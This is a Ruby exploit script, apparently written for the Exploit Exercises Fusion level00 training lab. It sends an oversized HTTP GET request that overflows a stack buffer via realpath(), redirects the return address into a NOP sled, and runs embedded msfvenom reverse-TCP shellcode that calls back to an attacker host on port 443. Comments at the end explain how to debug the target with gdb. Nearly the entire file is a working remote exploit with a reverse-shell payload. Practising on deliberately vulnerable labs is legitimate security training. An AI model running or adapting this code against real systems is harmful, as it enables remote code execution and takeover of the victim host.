#!/usr/bin/ruby

require"socket"

ip = "10.1.1.2"
port = 20000

#msfvenom -p linux/x86/shell_reverse_tcp LPORT=443 LHOST=10.1.1.3 -f ruby
#Payload size: 68 bytes
shell = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x01\x01" +
"\x03\x68\x02\x00\x01\xbb\x89\xe1\xb0\x66\x50\x51\x53\xb3" +
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f" +
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
#download ISO her
#https://drive.google.com/folderview?id=0B9RbZkKdRR8qV1BsVkRxak0zcVU&usp=sharing
#view code here
#https://exploit-exercises.com/fusion/level00/
#vuln function is realpath() in fix_path()
#in thi scase, the second argument was supplied to the function so the result 
#will be stored in the buffer[128] and overflow 
#GET [overflow] HTTP/1.1 shellcode

pathbuff = "A"*139 + "DDDD"			#DDDD = ret addr in fix_path function where realpath()
						#address of buffer in parse_http_request() was given 0xbffff8f8
						#so ret = buffer address + distance to shellcode
nop = "\x90"*16

buf = "GET "
buf += pathbuff
buf += " HTTP/1.1"

retIndex = buf.index("DDDD")			#find string index of ret addre the npatch it
buf[retIndex,4] = [0xbffff8f8 + buf.length + 4].pack("L").force_encoding("utf-8")

buf += nop
buf += shell
#puts buf.unpack("H*")

TCPSocket.open(ip, port) do |s|
  s.print buf
  loop do
    msg = s.recv(0xffff)
    break if msg.length == 0
    puts msg
  end
end


#to debug in gdb
#ssh to target

#on terminal
#gdb -p `pidof level00`

#in gdb
#set follow-fork-mode child			#this tell gdb to debug the child process
						#otherwise it'll stick to parent and cant do anything
#and insert a couple of breakpoints

#from attacker run ruby script

#back in gdb
#continue